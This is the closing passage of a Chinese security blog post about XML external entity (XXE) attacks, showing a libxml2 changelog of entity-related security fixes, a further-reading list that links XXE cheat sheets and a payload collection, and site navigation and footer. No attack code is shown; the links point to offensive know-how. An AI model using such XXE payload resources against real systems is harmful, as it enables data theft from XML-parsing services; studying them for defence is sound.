</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Prevent</span> <span style=color:#a6e22e>unwanted</span> <span style=color:#a6e22e>external</span> <span style=color:#a6e22e>entity</span> <span style=color:#a6e22e>reference</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>v2</span><span style=color:#f92672>.</span><span style=color:#ae81ff>9.2</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Oct</span> <span style=color:#ae81ff>16</span> <span style=color:#ae81ff>2014</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Security</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>Fix</span> <span style=color:#66d9ef>for</span> <span style=color:#a6e22e>CVE</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2014</span><span style=color:#f92672>-</span><span style=color:#ae81ff>3660</span> <span style=color:#a6e22e>billion</span> <span style=color:#a6e22e>laugh</span> <span style=color:#a6e22e>variant</span> (<span style=color:#a6e22e>Daniel</span> <span style=color:#a6e22e>Veillard</span>),
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>CVE</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2014</span><span style=color:#f92672>-</span><span style=color:#ae81ff>01</span><span style=color:#ae81ff>91</span> <span style=color:#66d9ef>Do</span> <span style=color:#66d9ef>not</span> <span style=color:#a6e22e>fetch</span> <span style=color:#a6e22e>external</span> <span style=color:#a6e22e>parameter</span> <span style=color:#a6e22e>entities</span> (<span style=color:#a6e22e>Daniel</span> <span style=color:#a6e22e>Veillard</span>)
</span></span><span style=display:flex><span><span style=color:#ae81ff>2.9</span><span style=color:#f92672>.</span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Apr</span> <span style=color:#ae81ff>19</span> <span style=color:#ae81ff>2013</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Activate</span> <span style=color:#a6e22e>detection</span> <span style=color:#a6e22e>of</span> <span style=color:#a6e22e>encoding</span> <span style=color:#a6e22e>in</span> <span style=color:#a6e22e>external</span> <span style=color:#a6e22e>subset</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2.9</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Sep</span> <span style=color:#ae81ff>11</span> <span style=color:#ae81ff>2012</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>Do</span> <span style=color:#66d9ef>not</span> <span style=color:#a6e22e>fetch</span> <span style=color:#a6e22e>external</span> <span style=color:#a6e22e>parsed</span> <span style=color:#a6e22e>entities</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=扩展阅读>扩展阅读<a hidden class=anchor aria-hidden=true href=#扩展阅读>#</a></h1><ul><li><a href=https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf>XML Out-Of-Band Data Retrieval</a></li><li><a href=https://www.vsecurity.com//download/publications/XMLDTDEntityAttacks.pdf>XMLDTDEntityAttacks.pdf</a></li><li><a href=https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing>XML External Entity (XXE) Processing</a></li><li><a href=https://security.tencent.com/index.php/blog/msg/69>未知攻焉知防——XXE漏洞攻防</a></li><li><a href=https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html>DTD Cheat Sheet</a></li><li><a href=https://www.tutorialspoint.com/dtd/dtd_syntax.htm>DTD - Syntax</a></li><li><a href=https://phonexicum.github.io/infosec/xxe.html>Information Security / infosec / XXE</a></li><li><a href=https://gist.github.com/staaldraad/01415b990939494879b4>XXE_payloads</a></li><li><a href=https://www.w3schools.com/xml/xml_dtd_intro.asp>DTD Tutorial</a></li><li><a href=https://www.w3.org/TR/xml/>Extensible Markup Language (XML) 1.0 (Fifth Edition)</a></li><li><a href="https://msdn.microsoft.com/en-us/library/ms256483(v=vs.110).aspx">about XML entity at msdn</a></li><li>Spring MVC xml绑定pojo造成的XXE （乌云papers-1911）</li><li>Oracle盲注结合XXE漏洞远程获取数据（乌云papers-6035）</li></ul></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/180814-python-jail-escape/><span class=title>« Prev</span><br><span>TJCTF2018：Mirror Mirror——一种绕过Python沙箱字符限制的方法</span></a>
<a class=next href=https://ret2neo.cn/post/180727penetrationtool/><span class=title>Next »</span><br><span>【译】渗透测试工具备忘录</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>